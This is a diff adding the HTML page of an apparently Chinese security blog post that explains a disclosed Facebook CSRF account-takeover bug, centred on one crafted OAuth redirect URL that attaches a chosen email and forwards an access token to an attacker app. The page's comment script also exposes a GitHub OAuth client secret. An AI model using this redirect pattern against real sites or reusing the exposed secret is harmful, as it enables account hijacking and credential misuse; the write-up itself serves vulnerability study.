@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            对“绕过Facebook Token进行CSRF账号接管”的文章解读
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/"> 
+                    对“绕过Facebook Token进行CSRF账号接管”的文章解读 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-02-18   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#浅谈绕过Facebook-Token进行CSRF账号接管"><span class="toc-list-text">浅谈绕过Facebook Token进行CSRF账号接管</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#漏洞关键条件"><span class="toc-list-text">漏洞关键条件</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#漏洞流程"><span class="toc-list-text">漏洞流程</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#总结-修复思考"><span class="toc-list-text">总结/修复思考</span></a></li></ol>
+</div>
+            <div class="content">
+                <h1 id="浅谈绕过Facebook-Token进行CSRF账号接管"><a href="#浅谈绕过Facebook-Token进行CSRF账号接管" class="headerlink" title="浅谈绕过Facebook Token进行CSRF账号接管"></a>浅谈绕过Facebook Token进行CSRF账号接管</h1><p>今天早上看到Sam大佬推特发了这篇文章，下午就见到先知上有译文了。为什么有译文了还要写这篇文章呢？安全圈的译文你懂的，大部分右键一把梭。</p>
+<p>从文章本身来说，还是有比较值得学习的地方，所以摘出来流程分析一下。</p>
+<p>原文：<a href="https://ysamm.com/?p=185" target="_blank" rel="noopener">https://ysamm.com/?p=185</a></p>
+<p>先知译文: <a href="https://xz.aliyun.com/t/4089#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/4089#toc-5</a></p>
+<h1 id="漏洞关键条件"><a href="#漏洞关键条件" class="headerlink" title="漏洞关键条件"></a>漏洞关键条件</h1><p>攻击者有一个oauth认证接口，即漏洞网站可以授权自己的网站</p>
+<h1 id="漏洞流程"><a href="#漏洞流程" class="headerlink" title="漏洞流程"></a>漏洞流程</h1><p><img src="https://i.loli.net/2019/02/19/5c6c1ace4e4e3.jpg" alt></p>
+<p>第二步，即location的Url如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.facebook.com/comet/dialog_DONOTUSE/?</span><br><span class="line">url=/add_contactpoint/dialog/submit/%3fcontactpoint=&#123;EMAIL_CHOSEN&#125;%26next=</span><br><span class="line">/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d&#123;ATTACKER_APP&#125;%2526redirect_uri%253d&#123;DOUBLE_URL_ENCODED_LINK]</span><br></pre></td></tr></table></figure>
+
+<p>next参数为<strong>下一步跳转参数</strong>，即邮箱绑定后跳转到<code>/v3.2/dialog/oauth%253fresponse_type%253dtoken%2526client_id%253d{ATTACKER_APP}%2526redirect_uri%253d{DOUBLE_URL_ENCODED_LINK]</code>获取token再redirect到attacker web</p>
+<h1 id="总结-修复思考"><a href="#总结-修复思考" class="headerlink" title="总结/修复思考"></a>总结/修复思考</h1><p>漏洞新颖的点就在授权后的跳转，这也算是一种突破oauth的新思路。利用信任站点的重定向进行其它oauth的绑定，再携带token二次重定向到attacker web。</p>
+<p>如果能再二次重定向的地方加一个权限验证，即attacker app与oauth匹配，会不会避免这样的越权呢？</p>
+<p>其次就是，如果我们省略三方授权，直接诱导用户点击第二步的location，不就更省事了么？这点我邮寄了sam师傅，希望日后有其它研究的师傅可以指点一下~</p>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/">https://hpdoger.cn/2019/02/18/浅谈绕过Facebook Token进行CSRF账号接管/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/03/25/0CTF2019-Web1WriteUp/">  0CTF2019-Web1WriteUp</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2019/02/14/Oauth2的两类漏洞挖掘/"> Oauth2的两类漏洞挖掘 </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Mon Feb 18 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
